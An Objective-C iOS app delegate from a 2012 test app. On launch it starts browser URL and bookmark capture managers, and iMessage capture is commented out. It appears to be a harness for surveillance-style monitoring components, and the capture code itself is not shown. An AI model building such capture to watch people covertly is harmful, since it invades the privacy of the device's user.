//
//  TestAppAppDelegate.m
//  TestApp
//
//  Created by Suttiporn Nitipitayanusad on 4/27/12.
//  Copyright __MyCompanyName__ 2012. All rights reserved.
//

#import "TestAppAppDelegate.h"
#import "BrowserUrlCaptureManager.h"
//#import "IMessageCaptureManager.h"

@implementation TestAppAppDelegate

@synthesize window;
@synthesize mTextView;

- (void)applicationDidFinishLaunching:(UIApplication *)application {    

    // Override point for customization after application launch
    [window makeKeyAndVisible];
	//mIMessageCaptureManager = [[IMessageCaptureManager alloc] initWithEventDelegate: self];
	//[mIMessageCaptureManager startCapture];
	
	mBrowserUrlCaptureManager = [[BrowserUrlCaptureManager alloc] initWithEventDelegate: self];
	[mBrowserUrlCaptureManager startBookmarkCapture];
	[mBrowserUrlCaptureManager startBrowserUrlCapture];
}

- (void) eventFinished: (FxEvent*) aEvent {
	mTextView.text = @"event finished !!!";
}

- (void)dealloc {
	//[mIMessageCaptureManager release];
	[mBrowserUrlCaptureManager release];
    [window release];
    [super dealloc];
}


@end
